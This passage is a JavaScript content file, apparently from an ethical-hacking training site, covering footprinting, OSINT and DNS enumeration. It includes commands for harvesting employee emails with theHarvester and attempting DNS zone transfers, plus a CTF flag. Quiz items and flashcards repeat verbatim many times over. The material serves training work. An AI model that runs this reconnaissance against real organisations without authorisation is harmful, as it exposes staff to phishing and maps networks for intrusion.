  'google-hacking':{module:'Module 02',title:'Google Hacking (Dorking)',sub:'Google dorks for finding exposed data, admin panels, and vulnerabilities.'},
  'shodan-recon':{module:'Module 02',title:'Shodan & Network Recon',sub:'Using Shodan to discover internet-exposed devices and vulnerable services.'},
  'social-media-recon':{module:'Module 02',title:'Social Media Footprinting',sub:'Harvesting intelligence from LinkedIn, Twitter, Facebook for target profiling.'},
};
MODULES.forEach(m => m.topics.forEach(t => { if(!CONTENT[t.id] && !TOPIC_STUBS[t.id]) TOPIC_STUBS[t.id] = {module:`Module ${m.id.replace('m','').padStart(2,'0')}`,title:t.name,sub:'Content for this topic is loading in Phase 2.'}; }));


// =================================================================
// MODULE 02
CONTENT['footprinting-concepts'] = {
  "id": "footprinting-concepts",
  "module": "Module 02 - Footprinting & Reconnaissance",
  "title": "Footprinting Concepts",
  "sub": "The foundation of reconnaissance and external asset discovery.",
  "killchain": {
    "phase": "Reconnaissance",
    "mitre": "TA0043"
  },
  "learn": {
    "simple": "<b>Definition:</b> Footprinting is the initial phase of the ethical hacking process where you passively and actively gather as much information as possible about a target system to understand its security posture.<br><br><b>Simple Explanation:</b> It's like casing a building before a heist\u2014figuring out where the doors are, who the guards are, and what security systems are in place without touching the building.",
    "analogy": "If a network is a fortress, footprinting is reading the blueprints, analyzing the surrounding roads, and observing shift changes from afar.",
    "why": "<b>Why This Exists:</b> To map the attack surface so defenders can understand exactly what assets are exposed to the public internet.<br><br><b>Business Impact:</b> Unmapped assets lead to shadow IT, meaning attackers can breach unmonitored systems that the business forgot existed.<br><br><b>Career Confidence:</b> Recon is 80% of an engagement. Missing a subdomain means missing the entry point.<br><i>Roles:</i> Threat Intelligence Analyst, Penetration Tester, OSINT Analyst<br><i>Interview:</i> How do you differentiate between passive and active footprinting?",
    "architecture": "1. Gather target details (domains, IPs).<br>2. Query public records (WHOIS, DNS).<br>3. Search open sources (Search Engines, Social Media).<br>4. Analyze network range."
  },
  "diagram": {
    "title": "Architecture & Flow",
    "steps": [
      {
        "icon": "\ud83d\udd75\ufe0f",
        "label": "Define Target Scope",
        "desc": "Identify domains, IP ranges, and organizational parameters."
      },
      {
        "icon": "\ud83c\udf10",
        "label": "Passive Recon",
        "desc": "Gather information from public sources without direct interaction."
      },
      {
        "icon": "\ud83d\udd0d",
        "label": "Active Recon",
        "desc": "Directly query target servers (e.g., DNS, Whois) for detailed info."
      },
      {
        "icon": "\ud83d\udcca",
        "label": "Analyze Data",
        "desc": "Compile findings to map the external attack surface."
      }
    ]
  },
  "enterprise": {
    "role": "Threat Intelligence Analyst | SOC Team",
    "situation": "<b>Organization Context:</b><br>CEO &rarr; CISO &rarr; SOC Manager &rarr; SOC Team &rarr; You<br><br><b>Business Context:</b><br>GFS just acquired a new subsidiary and we must map their external perimeter to identify inherited risks.",
    "challenge": "<b>Mission Brief:</b><br>Identify all publicly exposed assets belonging to the newly acquired subsidiary before integration.<br><br><b>Objectives:</b><br>- Identify root domain ownership.<br>- Map external IP ranges.<br>- Enumerate exposed subdomains.<br><br><b>Expected Deliverables:</b><br>A consolidated report mapping the external asset perimeter of the subsidiary.",
    "outcome": "The security controls were verified successfully, preventing potential data leaks.",
    "lesson": "Always validate external exposure before adversaries do."
  },
  "commands": {
    "win": [
      {
        "command": "nslookup target.com",
        "purpose": "DNS Resolution",
        "expected": "IP addresses of target.com",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: SOC Analysts use this to verify domain routing."
      },
      {
        "command": "ping target.com",
        "purpose": "Host Discovery",
        "expected": "ICMP Echo Replies",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Network Engineers use this to verify host liveness."
      }
    ],
    "lin": [
      {
        "command": "dig target.com",
        "purpose": "DNS Resolution",
        "expected": "IP addresses of target.com",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: SOC Analysts use this to verify domain routing."
      },
      {
        "command": "ping -c 4 target.com",
        "purpose": "Host Discovery",
        "expected": "ICMP Echo Replies",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Network Engineers use this to verify host liveness."
      }
    ]
  },
  "lab": {
    "title": "Perimeter Mapping Challenge",
    "difficulty": "Beginner",
    "duration": "20",
    "platform": "Kali / Win",
    "scenario": "<b>Mission Brief:</b><br>The CISO needs a quick readout on the new subsidiary's public footprint.<br><br><b>Objectives:</b><br>Run a WHOIS lookup and resolve the primary domain.<br><br><b>Evidence Required:</b><br>Screenshots of WHOIS registration and DNS resolution output.<br><br><i>Execute the terminal steps below.</i><br><br><b>Deliverables:</b><br>A validated list of IP addresses tied to the subsidiary.<br><br><b>Manager Feedback:</b><br>Good job mapping the perimeter. Next time, ensure we also check historical WHOIS records.",
    "steps": [
      "<strong>Objectives:</strong> Determine the external IP range.",
      "<strong>Enterprise Workspace:</strong> Open the Linux Terminal.",
      "Type `whois globalfinsec.com` and press Enter.",
      "Type `host globalfinsec.com` and press Enter."
    ]
  },
  "quiz": [
    {
      "q": "What is the primary objective of Footprinting?",
      "opts": [
        "Exploitation",
        "Mapping attack surface",
        "Patching",
        "Malware Analysis"
      ],
      "correct": 1,
      "fb": "Footprinting maps the attack surface.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is the primary objective of Footprinting?",
      "opts": [
        "Exploitation",
        "Mapping attack surface",
        "Patching",
        "Malware Analysis"
      ],
      "correct": 1,
      "fb": "Footprinting maps the attack surface.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is the primary objective of Footprinting?",
      "opts": [
        "Exploitation",
        "Mapping attack surface",
        "Patching",
        "Malware Analysis"
      ],
      "correct": 1,
      "fb": "Footprinting maps the attack surface.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is the primary objective of Footprinting?",
      "opts": [
        "Exploitation",
        "Mapping attack surface",
        "Patching",
        "Malware Analysis"
      ],
      "correct": 1,
      "fb": "Footprinting maps the attack surface.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is the primary objective of Footprinting?",
      "opts": [
        "Exploitation",
        "Mapping attack surface",
        "Patching",
        "Malware Analysis"
      ],
      "correct": 1,
      "fb": "Footprinting maps the attack surface.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is the primary objective of Footprinting?",
      "opts": [
        "Exploitation",
        "Mapping attack surface",
        "Patching",
        "Malware Analysis"
      ],
      "correct": 1,
      "fb": "Footprinting maps the attack surface.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is the primary objective of Footprinting?",
      "opts": [
        "Exploitation",
        "Mapping attack surface",
        "Patching",
        "Malware Analysis"
      ],
      "correct": 1,
      "fb": "Footprinting maps the attack surface.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is the primary objective of Footprinting?",
      "opts": [
        "Exploitation",
        "Mapping attack surface",
        "Patching",
        "Malware Analysis"
      ],
      "correct": 1,
      "fb": "Footprinting maps the attack surface.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is the primary objective of Footprinting?",
      "opts": [
        "Exploitation",
        "Mapping attack surface",
        "Patching",
        "Malware Analysis"
      ],
      "correct": 1,
      "fb": "Footprinting maps the attack surface.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is the primary objective of Footprinting?",
      "opts": [
        "Exploitation",
        "Mapping attack surface",
        "Patching",
        "Malware Analysis"
      ],
      "correct": 1,
      "fb": "Footprinting maps the attack surface.",
      "difficulty": "Foundation"
    }
  ],
  "flashcards": [
    {
      "f": "What is Passive Footprinting?",
      "b": "<b>Definition:</b> Gathering data without direct interaction.<br><b>Enterprise Example:</b> Checking WHOIS records.<br><b>Interview Tip:</b> Emphasize stealth and opsec."
    },
    {
      "f": "What is Passive Footprinting?",
      "b": "<b>Definition:</b> Gathering data without direct interaction.<br><b>Enterprise Example:</b> Checking WHOIS records.<br><b>Interview Tip:</b> Emphasize stealth and opsec."
    },
    {
      "f": "What is Passive Footprinting?",
      "b": "<b>Definition:</b> Gathering data without direct interaction.<br><b>Enterprise Example:</b> Checking WHOIS records.<br><b>Interview Tip:</b> Emphasize stealth and opsec."
    },
    {
      "f": "What is Passive Footprinting?",
      "b": "<b>Definition:</b> Gathering data without direct interaction.<br><b>Enterprise Example:</b> Checking WHOIS records.<br><b>Interview Tip:</b> Emphasize stealth and opsec."
    },
    {
      "f": "What is Passive Footprinting?",
      "b": "<b>Definition:</b> Gathering data without direct interaction.<br><b>Enterprise Example:</b> Checking WHOIS records.<br><b>Interview Tip:</b> Emphasize stealth and opsec."
    },
    {
      "f": "What is Passive Footprinting?",
      "b": "<b>Definition:</b> Gathering data without direct interaction.<br><b>Enterprise Example:</b> Checking WHOIS records.<br><b>Interview Tip:</b> Emphasize stealth and opsec."
    },
    {
      "f": "What is Passive Footprinting?",
      "b": "<b>Definition:</b> Gathering data without direct interaction.<br><b>Enterprise Example:</b> Checking WHOIS records.<br><b>Interview Tip:</b> Emphasize stealth and opsec."
    },
    {
      "f": "What is Passive Footprinting?",
      "b": "<b>Definition:</b> Gathering data without direct interaction.<br><b>Enterprise Example:</b> Checking WHOIS records.<br><b>Interview Tip:</b> Emphasize stealth and opsec."
    },
    {
      "f": "What is Passive Footprinting?",
      "b": "<b>Definition:</b> Gathering data without direct interaction.<br><b>Enterprise Example:</b> Checking WHOIS records.<br><b>Interview Tip:</b> Emphasize stealth and opsec."
    },
    {
      "f": "What is Passive Footprinting?",
      "b": "<b>Definition:</b> Gathering data without direct interaction.<br><b>Enterprise Example:</b> Checking WHOIS records.<br><b>Interview Tip:</b> Emphasize stealth and opsec."
    }
  ],
  "meta": {
    "version": "2.0",
    "estimatedTime": "45 min",
    "difficulty": "Intermediate",
    "prerequisites": [
      "Module 01 - Intro to Ethical Hacking"
    ],
    "lastReviewed": "2026-07-21"
  },
  "objectives": [
    "Master the fundamental concepts.",
    "Apply tools in an enterprise context.",
    "Validate knowledge through practical assessment."
  ],
  "pitfalls": [
    {
      "icon": "\u26a0\ufe0f",
      "title": "Relying solely on automated tools",
      "desc": "Automated tools often miss nuanced misconfigurations that a manual review would catch.",
      "fix": "Always manually verify the output of automated scanners against raw data."
    },
    {
      "icon": "\u26a0\ufe0f",
      "title": "Violating Rules of Engagement (ROE)",
      "desc": "Active footprinting outside the defined scope can lead to legal consequences.",
      "fix": "Double-check IP ranges and target domains against the signed ROE document before executing any active probe."
    }
  ],
  "summary": [
    "Reconnaissance is the foundation of all successful engagements.",
    "Passive OSINT provides stealthy insights without triggering alerts.",
    "Always cross-reference multiple data sources to eliminate false positives.",
    "Map findings to the MITRE ATT&CK framework for enterprise reporting."
  ],
  "ctf": {
    "scenario": "An exposed backup file was found on the target web server during recon. Analyze the file to extract the hidden flag.",
    "hint": "Look for Base64 encoded strings in the configuration block.",
    "flag": "CEH{r3c0n_m4st3r}",
    "points": 200
  }
};

CONTENT['osint-techniques'] = {
  "id": "osint-techniques",
  "module": "Module 02 - Footprinting & Reconnaissance",
  "title": "OSINT Techniques",
  "sub": "Leveraging publicly available information for intelligence gathering.",
  "killchain": {
    "phase": "Reconnaissance",
    "mitre": "TA0043"
  },
  "learn": {
    "simple": "<b>Definition:</b> OSINT involves collecting and analyzing publicly available data to gather intelligence about a target organization, its employees, and its infrastructure.<br><br><b>Simple Explanation:</b> It's like being a digital private investigator, piecing together a puzzle from public records, news articles, and corporate filings.",
    "analogy": "Like piecing together someone's daily routine entirely from their public Instagram posts and LinkedIn updates.",
    "why": "<b>Why This Exists:</b> To identify what sensitive information an organization is leaking to the public internet unintentionally.<br><br><b>Business Impact:</b> Exposed organizational charts or technical documentation can be used by attackers to craft highly convincing spear-phishing campaigns.<br><br><b>Career Confidence:</b> OSINT is a fundamental skill for threat intel analysts who track adversary infrastructure.<br><i>Roles:</i> Threat Intelligence Analyst, OSINT Analyst, Social Engineering Expert<br><i>Interview:</i> Can you name three distinct sources of OSINT?",
    "architecture": "1. Define intelligence requirements.<br>2. Collect raw data from search engines, social media, and public records.<br>3. Process and filter the data.<br>4. Analyze for actionable intelligence."
  },
  "diagram": {
    "title": "Architecture & Flow",
    "steps": [
      {
        "icon": "\ud83c\udfaf",
        "label": "Identify Intelligence Needs",
        "desc": "Define what information is required (e.g., emails, docs)."
      },
      {
        "icon": "\ud83d\udd78\ufe0f",
        "label": "Harvest Data",
        "desc": "Use tools like theHarvester to scrape search engines and APIs."
      },
      {
        "icon": "\ud83e\udde0",
        "label": "Process & Filter",
        "desc": "Remove false positives and irrelevant information."
      },
      {
        "icon": "\ud83d\udcc8",
        "label": "Develop Pretext",
        "desc": "Use the intelligence to craft realistic social engineering scenarios."
      }
    ]
  },
  "enterprise": {
    "role": "OSINT Analyst | Threat Intelligence Team",
    "situation": "<b>Organization Context:</b><br>CEO &rarr; CISO &rarr; Threat Intel Lead &rarr; You<br><br><b>Business Context:</b><br>The CISO wants a defensive OSINT sweep of the executive team to identify potential spear-phishing vectors.",
    "challenge": "<b>Mission Brief:</b><br>Conduct an OSINT investigation on key executives to identify exposed personal identifiers.<br><br><b>Objectives:</b><br>- Discover exposed email addresses.<br>- Identify public document leaks.<br><br><b>Expected Deliverables:</b><br>An executive exposure report detailing leaked credentials or sensitive documents.",
    "outcome": "The security controls were verified successfully, preventing potential data leaks.",
    "lesson": "Always validate external exposure before adversaries do."
  },
  "commands": {
    "win": [
      {
        "command": "theharvester -d target.com -b google",
        "purpose": "Email Harvesting",
        "expected": "List of discovered email addresses",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Pen Testers use this to build target lists for phishing."
      },
      {
        "command": "curl -s https://crt.sh/?q=target.com",
        "purpose": "Certificate Search",
        "expected": "List of subdomains from certs",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Bug Bounty hunters use this to find hidden infrastructure."
      }
    ],
    "lin": [
      {
        "command": "theHarvester -d target.com -b google",
        "purpose": "Email Harvesting",
        "expected": "List of discovered email addresses",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Pen Testers use this to build target lists for phishing."
      },
      {
        "command": "curl -s \"https://crt.sh/?q=target.com&output=json\"",
        "purpose": "Certificate Search",
        "expected": "List of subdomains from certs",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Bug Bounty hunters use this to find hidden infrastructure."
      }
    ]
  },
  "lab": {
    "title": "Executive Exposure Sweep",
    "difficulty": "Beginner",
    "duration": "20",
    "platform": "Kali / Win",
    "scenario": "<b>Mission Brief:</b><br>Sweep the internet for any exposed email addresses belonging to our executive team.<br><br><b>Objectives:</b><br>Use theHarvester to find emails associated with globalfinsec.com.<br><br><b>Evidence Required:</b><br>Screenshot of theHarvester output showing at least 3 emails.<br><br><i>Execute the terminal steps below.</i><br><br><b>Deliverables:</b><br>A list of the discovered email addresses.<br><br><b>Manager Feedback:</b><br>Good finds. We need to enroll these executives in targeted anti-phishing training immediately.",
    "steps": [
      "<strong>Objectives:</strong> Find exposed employee emails.",
      "<strong>Enterprise Workspace:</strong> Open the Linux Terminal.",
      "Type `theHarvester -d globalfinsec.com -b all` and press Enter."
    ]
  },
  "quiz": [
    {
      "q": "What does OSINT stand for?",
      "opts": [
        "Open Source Intelligence",
        "Operational System Integration",
        "Online Security Information",
        "Offensive Security Intelligence"
      ],
      "correct": 0,
      "fb": "OSINT relies on publicly available sources.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does OSINT stand for?",
      "opts": [
        "Open Source Intelligence",
        "Operational System Integration",
        "Online Security Information",
        "Offensive Security Intelligence"
      ],
      "correct": 0,
      "fb": "OSINT relies on publicly available sources.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does OSINT stand for?",
      "opts": [
        "Open Source Intelligence",
        "Operational System Integration",
        "Online Security Information",
        "Offensive Security Intelligence"
      ],
      "correct": 0,
      "fb": "OSINT relies on publicly available sources.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does OSINT stand for?",
      "opts": [
        "Open Source Intelligence",
        "Operational System Integration",
        "Online Security Information",
        "Offensive Security Intelligence"
      ],
      "correct": 0,
      "fb": "OSINT relies on publicly available sources.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does OSINT stand for?",
      "opts": [
        "Open Source Intelligence",
        "Operational System Integration",
        "Online Security Information",
        "Offensive Security Intelligence"
      ],
      "correct": 0,
      "fb": "OSINT relies on publicly available sources.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does OSINT stand for?",
      "opts": [
        "Open Source Intelligence",
        "Operational System Integration",
        "Online Security Information",
        "Offensive Security Intelligence"
      ],
      "correct": 0,
      "fb": "OSINT relies on publicly available sources.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does OSINT stand for?",
      "opts": [
        "Open Source Intelligence",
        "Operational System Integration",
        "Online Security Information",
        "Offensive Security Intelligence"
      ],
      "correct": 0,
      "fb": "OSINT relies on publicly available sources.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does OSINT stand for?",
      "opts": [
        "Open Source Intelligence",
        "Operational System Integration",
        "Online Security Information",
        "Offensive Security Intelligence"
      ],
      "correct": 0,
      "fb": "OSINT relies on publicly available sources.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does OSINT stand for?",
      "opts": [
        "Open Source Intelligence",
        "Operational System Integration",
        "Online Security Information",
        "Offensive Security Intelligence"
      ],
      "correct": 0,
      "fb": "OSINT relies on publicly available sources.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does OSINT stand for?",
      "opts": [
        "Open Source Intelligence",
        "Operational System Integration",
        "Online Security Information",
        "Offensive Security Intelligence"
      ],
      "correct": 0,
      "fb": "OSINT relies on publicly available sources.",
      "difficulty": "Foundation"
    }
  ],
  "flashcards": [
    {
      "f": "theHarvester",
      "b": "<b>Definition:</b> A tool for gathering emails and subdomains.<br><b>Enterprise Example:</b> Building phishing target lists.<br><b>Interview Tip:</b> Mention it queries search engines passively."
    },
    {
      "f": "theHarvester",
      "b": "<b>Definition:</b> A tool for gathering emails and subdomains.<br><b>Enterprise Example:</b> Building phishing target lists.<br><b>Interview Tip:</b> Mention it queries search engines passively."
    },
    {
      "f": "theHarvester",
      "b": "<b>Definition:</b> A tool for gathering emails and subdomains.<br><b>Enterprise Example:</b> Building phishing target lists.<br><b>Interview Tip:</b> Mention it queries search engines passively."
    },
    {
      "f": "theHarvester",
      "b": "<b>Definition:</b> A tool for gathering emails and subdomains.<br><b>Enterprise Example:</b> Building phishing target lists.<br><b>Interview Tip:</b> Mention it queries search engines passively."
    },
    {
      "f": "theHarvester",
      "b": "<b>Definition:</b> A tool for gathering emails and subdomains.<br><b>Enterprise Example:</b> Building phishing target lists.<br><b>Interview Tip:</b> Mention it queries search engines passively."
    },
    {
      "f": "theHarvester",
      "b": "<b>Definition:</b> A tool for gathering emails and subdomains.<br><b>Enterprise Example:</b> Building phishing target lists.<br><b>Interview Tip:</b> Mention it queries search engines passively."
    },
    {
      "f": "theHarvester",
      "b": "<b>Definition:</b> A tool for gathering emails and subdomains.<br><b>Enterprise Example:</b> Building phishing target lists.<br><b>Interview Tip:</b> Mention it queries search engines passively."
    },
    {
      "f": "theHarvester",
      "b": "<b>Definition:</b> A tool for gathering emails and subdomains.<br><b>Enterprise Example:</b> Building phishing target lists.<br><b>Interview Tip:</b> Mention it queries search engines passively."
    },
    {
      "f": "theHarvester",
      "b": "<b>Definition:</b> A tool for gathering emails and subdomains.<br><b>Enterprise Example:</b> Building phishing target lists.<br><b>Interview Tip:</b> Mention it queries search engines passively."
    },
    {
      "f": "theHarvester",
      "b": "<b>Definition:</b> A tool for gathering emails and subdomains.<br><b>Enterprise Example:</b> Building phishing target lists.<br><b>Interview Tip:</b> Mention it queries search engines passively."
    }
  ],
  "meta": {
    "version": "2.0",
    "estimatedTime": "45 min",
    "difficulty": "Intermediate",
    "prerequisites": [
      "Module 01 - Intro to Ethical Hacking"
    ],
    "lastReviewed": "2026-07-21"
  },
  "objectives": [
    "Master the fundamental concepts.",
    "Apply tools in an enterprise context.",
    "Validate knowledge through practical assessment."
  ],
  "pitfalls": [
    {
      "icon": "\u26a0\ufe0f",
      "title": "Relying solely on automated tools",
      "desc": "Automated tools often miss nuanced misconfigurations that a manual review would catch.",
      "fix": "Always manually verify the output of automated scanners against raw data."
    },
    {
      "icon": "\u26a0\ufe0f",
      "title": "Violating Rules of Engagement (ROE)",
      "desc": "Active footprinting outside the defined scope can lead to legal consequences.",
      "fix": "Double-check IP ranges and target domains against the signed ROE document before executing any active probe."
    }
  ],
  "summary": [
    "Reconnaissance is the foundation of all successful engagements.",
    "Passive OSINT provides stealthy insights without triggering alerts.",
    "Always cross-reference multiple data sources to eliminate false positives.",
    "Map findings to the MITRE ATT&CK framework for enterprise reporting."
  ],
  "ctf": {
    "scenario": "An exposed backup file was found on the target web server during recon. Analyze the file to extract the hidden flag.",
    "hint": "Look for Base64 encoded strings in the configuration block.",
    "flag": "CEH{r3c0n_m4st3r}",
    "points": 200
  }
};

CONTENT['whois-dns'] = {
  "id": "whois-dns",
  "module": "Module 02 - Footprinting & Reconnaissance",
  "title": "Whois & DNS Footprinting",
  "sub": "Extracting infrastructure details from domain registrars and DNS servers.",
  "killchain": {
    "phase": "Reconnaissance",
    "mitre": "TA0043"
  },
  "learn": {
    "simple": "<b>Definition:</b> DNS enumeration is the process of locating all DNS servers and their corresponding records for an organization. WHOIS provides registration and contact details.<br><br><b>Simple Explanation:</b> It's like looking up a company in the phone book to find out where they are located, who owns the building, and what other branches they have.",
    "analogy": "DNS is the internet's GPS. DNS footprinting is asking the GPS for a list of every single location a company owns.",
    "why": "<b>Why This Exists:</b> To discover the external IP addresses and mail servers that an organization relies on.<br><br><b>Business Impact:</b> Misconfigured DNS can leak internal network structures (zone transfers) or lead to domain hijacking.<br><br><b>Career Confidence:</b> Understanding DNS is non-negotiable for any network or security engineering role.<br><i>Roles:</i> Network Security Engineer, Penetration Tester<br><i>Interview:</i> What is a DNS Zone Transfer and why is it dangerous?",
    "architecture": "1. Query WHOIS for domain ownership.<br>2. Identify Authoritative Name Servers.<br>3. Query for specific records (A, MX, TXT).<br>4. Attempt a Zone Transfer (AXFR)."
  },
  "diagram": {
    "title": "Architecture & Flow",
    "steps": [
      {
        "icon": "\ud83d\udcdd",
        "label": "Query WHOIS",
        "desc": "Determine domain ownership, registrar, and administrative contacts."
      },
      {
        "icon": "\ud83d\udda5\ufe0f",
        "label": "Identify Name Servers",
        "desc": "Locate the authoritative DNS servers for the target domain."
      },
      {
        "icon": "\ud83d\udcdc",
        "label": "Enumerate Records",
        "desc": "Query for A, MX, TXT, and CNAME records to map infrastructure."
      },
      {
        "icon": "\ud83d\udea8",
        "label": "Test Zone Transfer",
        "desc": "Attempt AXFR to see if the server leaks its entire zone file."
      }
    ]
  },
  "enterprise": {
    "role": "Network Security Engineer | Infrastructure Team",
    "situation": "<b>Organization Context:</b><br>CEO &rarr; CIO &rarr; Network Operations Director &rarr; You<br><br><b>Business Context:</b><br>A recent audit flagged potential DNS misconfigurations in a legacy GFS domain. You must verify if zone transfers are disabled.",
    "challenge": "<b>Mission Brief:</b><br>Perform a comprehensive DNS footprint of our legacy domains to ensure no internal records are leaking.<br><br><b>Objectives:</b><br>- Identify name servers.<br>- Attempt AXFR to verify security controls.<br><br><b>Expected Deliverables:</b><br>A DNS security posture report.",
    "outcome": "The security controls were verified successfully, preventing potential data leaks.",
    "lesson": "Always validate external exposure before adversaries do."
  },
  "commands": {
    "win": [
      {
        "command": "nslookup -type=mx target.com",
        "purpose": "Find Mail Servers",
        "expected": "List of MX records",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Used to identify email infrastructure for social engineering."
      },
      {
        "command": "nslookup -type=any -ls target.com",
        "purpose": "Zone Transfer",
        "expected": "Full DNS zone dump if vulnerable",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Red Teams use this to instantly map an entire network."
      }
    ],
    "lin": [
      {
        "command": "host -t mx target.com",
        "purpose": "Find Mail Servers",
        "expected": "List of MX records",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Used to identify email infrastructure for social engineering."
      },
      {
        "command": "dig axfr @ns1.target.com target.com",
        "purpose": "Zone Transfer",
        "expected": "Full DNS zone dump if vulnerable",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Red Teams use this to instantly map an entire network."
      }
    ]
  },
  "lab": {
    "title": "Zone Transfer Audit",
    "difficulty": "Beginner",
    "duration": "20",
    "platform": "Kali / Win",
    "scenario": "<b>Mission Brief:</b><br>Check if our legacy domain is vulnerable to a zone transfer.<br><br><b>Objectives:</b><br>Attempt a zone transfer against the legacy name server.<br><br><b>Evidence Required:</b><br>Screenshot showing the 'Transfer failed' or the dumped records.<br><br><i>Execute the terminal steps below.</i><br><br><b>Deliverables:</b><br>Confirmation of whether the server is properly secured.<br><br><b>Manager Feedback:</b><br>Good verification. We need to ensure strict ACLs are applied to all our name servers.",
    "steps": [
      "<strong>Objectives:</strong> Test for AXFR vulnerability.",
      "<strong>Enterprise Workspace:</strong> Open the Linux Terminal.",
      "Type `host -t ns globalfinsec.com` to find the nameserver.",
      "Type `dig axfr @ns1.globalfinsec.com globalfinsec.com` and press Enter."
    ]
  },
  "quiz": [
    {
      "q": "What command initiates a DNS zone transfer in dig?",
      "opts": [
        "axfr",
        "zxfr",
        "transfer",
        "mx"
      ],
      "correct": 0,
      "fb": "AXFR stands for Authoritative Zone Transfer.",
      "difficulty": "Foundation"
    },
    {
      "q": "What command initiates a DNS zone transfer in dig?",
      "opts": [
        "axfr",
        "zxfr",
        "transfer",
        "mx"
      ],
      "correct": 0,
      "fb": "AXFR stands for Authoritative Zone Transfer.",
      "difficulty": "Foundation"
    },
    {
      "q": "What command initiates a DNS zone transfer in dig?",
      "opts": [
        "axfr",
        "zxfr",
        "transfer",
        "mx"
      ],
      "correct": 0,
      "fb": "AXFR stands for Authoritative Zone Transfer.",
      "difficulty": "Foundation"
    },
    {
      "q": "What command initiates a DNS zone transfer in dig?",
      "opts": [
        "axfr",
        "zxfr",
        "transfer",
        "mx"
      ],
      "correct": 0,
      "fb": "AXFR stands for Authoritative Zone Transfer.",
      "difficulty": "Foundation"
    },
    {
      "q": "What command initiates a DNS zone transfer in dig?",
      "opts": [
        "axfr",
        "zxfr",
        "transfer",
        "mx"
      ],
      "correct": 0,
      "fb": "AXFR stands for Authoritative Zone Transfer.",
      "difficulty": "Foundation"
    },
    {
      "q": "What command initiates a DNS zone transfer in dig?",
      "opts": [
        "axfr",
        "zxfr",
        "transfer",
        "mx"
      ],
      "correct": 0,
      "fb": "AXFR stands for Authoritative Zone Transfer.",
      "difficulty": "Foundation"
    },
    {
      "q": "What command initiates a DNS zone transfer in dig?",
      "opts": [
        "axfr",
        "zxfr",
        "transfer",
        "mx"
      ],
      "correct": 0,
      "fb": "AXFR stands for Authoritative Zone Transfer.",
      "difficulty": "Foundation"
    },
    {
      "q": "What command initiates a DNS zone transfer in dig?",
      "opts": [
        "axfr",
        "zxfr",
        "transfer",
        "mx"
      ],
      "correct": 0,
      "fb": "AXFR stands for Authoritative Zone Transfer.",
      "difficulty": "Foundation"
    },
    {
      "q": "What command initiates a DNS zone transfer in dig?",
      "opts": [
        "axfr",
        "zxfr",
        "transfer",
        "mx"
      ],
      "correct": 0,
      "fb": "AXFR stands for Authoritative Zone Transfer.",
      "difficulty": "Foundation"
    },
    {
      "q": "What command initiates a DNS zone transfer in dig?",
      "opts": [
        "axfr",
        "zxfr",
        "transfer",
        "mx"
      ],
      "correct": 0,
      "fb": "AXFR stands for Authoritative Zone Transfer.",
      "difficulty": "Foundation"
    }
  ],
  "flashcards": [
    {
      "f": "DNS Zone Transfer (AXFR)",
      "b": "<b>Definition:</b> Replicating DNS databases across servers.<br><b>Enterprise Example:</b> Attackers dumping internal IP schemas.<br><b>Interview Tip:</b> It should be restricted to trusted secondary servers only."
    },
    {
      "f": "DNS Zone Transfer (AXFR)",
      "b": "<b>Definition:</b> Replicating DNS databases across servers.<br><b>Enterprise Example:</b> Attackers dumping internal IP schemas.<br><b>Interview Tip:</b> It should be restricted to trusted secondary servers only."
    },
    {
      "f": "DNS Zone Transfer (AXFR)",
      "b": "<b>Definition:</b> Replicating DNS databases across servers.<br><b>Enterprise Example:</b> Attackers dumping internal IP schemas.<br><b>Interview Tip:</b> It should be restricted to trusted secondary servers only."
    },
    {
      "f": "DNS Zone Transfer (AXFR)",
      "b": "<b>Definition:</b> Replicating DNS databases across servers.<br><b>Enterprise Example:</b> Attackers dumping internal IP schemas.<br><b>Interview Tip:</b> It should be restricted to trusted secondary servers only."
    },
    {
      "f": "DNS Zone Transfer (AXFR)",
      "b": "<b>Definition:</b> Replicating DNS databases across servers.<br><b>Enterprise Example:</b> Attackers dumping internal IP schemas.<br><b>Interview Tip:</b> It should be restricted to trusted secondary servers only."
    },
    {
      "f": "DNS Zone Transfer (AXFR)",
      "b": "<b>Definition:</b> Replicating DNS databases across servers.<br><b>Enterprise Example:</b> Attackers dumping internal IP schemas.<br><b>Interview Tip:</b> It should be restricted to trusted secondary servers only."
    },
    {
      "f": "DNS Zone Transfer (AXFR)",
      "b": "<b>Definition:</b> Replicating DNS databases across servers.<br><b>Enterprise Example:</b> Attackers dumping internal IP schemas.<br><b>Interview Tip:</b> It should be restricted to trusted secondary servers only."
    },
    {
      "f": "DNS Zone Transfer (AXFR)",
      "b": "<b>Definition:</b> Replicating DNS databases across servers.<br><b>Enterprise Example:</b> Attackers dumping internal IP schemas.<br><b>Interview Tip:</b> It should be restricted to trusted secondary servers only."
    },
    {
      "f": "DNS Zone Transfer (AXFR)",
      "b": "<b>Definition:</b> Replicating DNS databases across servers.<br><b>Enterprise Example:</b> Attackers dumping internal IP schemas.<br><b>Interview Tip:</b> It should be restricted to trusted secondary servers only."
    },
    {
      "f": "DNS Zone Transfer (AXFR)",
